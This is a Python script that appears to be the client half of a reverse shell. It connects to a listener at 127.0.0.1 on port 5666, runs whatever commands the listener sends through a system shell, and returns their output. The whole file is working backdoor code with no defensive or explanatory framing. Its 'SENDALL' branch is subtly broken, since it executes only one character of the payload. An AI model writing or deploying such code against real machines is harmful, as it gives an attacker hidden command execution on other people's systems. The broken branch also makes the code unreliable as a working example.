import socket
import json
import os
import subprocess

def send_msg(message):
    s.send(message.encode())

def recive_message():
    msg = s.recv(1024).decode()
    return str(msg)

def communication():
    while True:
        payload = recive_message()
        if payload =="exit":
            break
        elif payload == "EXIT":
            print("closing clients")
            s.close()
        elif payload=="CHECKER":
            print("CHCKER")
        elif payload[:3] == "cd ":
            os.chdir(payload[3:])
        elif payload[:7] == "SENDALL":
            cmd = list(payload)[1]
            print(str(payload))
            execute = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            send_msg("Command Ran")

        else:
            print(str(payload))
            execute = subprocess.Popen(str(payload), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            send_msg(result)
        


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 5666))
communication()
exit()